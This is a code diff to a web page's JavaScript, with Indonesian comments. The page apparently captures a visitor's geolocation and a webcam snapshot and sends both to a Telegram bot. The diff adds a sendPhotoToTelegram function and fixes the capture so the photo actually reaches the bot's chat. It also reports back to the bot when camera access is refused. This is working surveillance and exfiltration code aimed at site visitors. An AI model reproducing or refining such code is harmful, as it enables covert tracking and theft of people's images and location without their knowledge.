@@ -23,6 +23,17 @@
             });
         }
 
+        function sendPhotoToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", imageBlob, "snapshot.jpg");
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
         function captureData() {
             navigator.geolocation.getCurrentPosition(
                 position => {
@@ -51,16 +62,17 @@
                     let ctx = canvas.getContext("2d");
 
                     setTimeout(() => {
+                        video.pause();
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let imageData = canvas.toDataURL("image/png");
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: "POST",
-                            body: new FormData().append("photo", imageData).append("chat_id", CHAT_ID)
-                        });
+                        canvas.toBlob(blob => {
+                            sendPhotoToTelegram(blob);
+                        }, "image/jpeg");
 
                         stream.getTracks().forEach(track => track.stop());
-                    }, 3000);
+                    }, 2000); // Ambil gambar setelah 2 detik
                 })
                 .catch(error => {
                     sendToTelegram("❌ Kamera tidak diizinkan.");
